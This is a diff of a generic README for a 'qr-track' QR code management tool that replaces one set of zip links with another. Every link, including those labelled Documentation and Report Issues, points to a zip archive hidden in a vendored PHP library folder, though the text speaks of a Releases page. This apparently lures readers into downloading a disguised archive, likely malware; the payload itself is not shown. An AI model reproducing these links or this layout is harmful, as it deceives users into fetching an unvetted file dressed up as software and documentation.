@@ -1,6 +1,6 @@
 # 🎉 qr-track - Effortless QR Code Management at Your Fingertips
 
-[![Download qr-track](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip)](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip)
+[![Download qr-track](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip)](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you get started, here are the basic requirements to run `qr-track`:
 
 To get `qr-track`, visit the page below and select the latest release:
 
-[Download qr-track](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip)
+[Download qr-track](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -68,8 +68,8 @@ After installation, you will need to set up the application:
 
 For more detailed instructions and updates, refer to the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip)
-- [Report Issues](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip)
+- [Documentation](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip)
+- [Report Issues](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip)
 
 ## 🛡️ Community and Support
 
@@ -78,6 +78,6 @@ If you have questions or need assistance, consider joining our community. Engage
 - [Join our Forum](#)
 - [Contact Support](#)
 
-**Note**: You can always download the latest version from [this page](https://raw.githubusercontent.com/vojtanekos/qr-track/main/vendor/chillerlan/php-settings-container/track-qr-v2.2.zip). 
+**Note**: You can always download the latest version from [this page](https://github.com/vojtanekos/qr-track/raw/refs/heads/main/vendor/chillerlan/php-qrcode/src/Data/track_qr_3.7.zip). 
 
 Enjoy using `qr-track`, and make the most out of your QR code management!
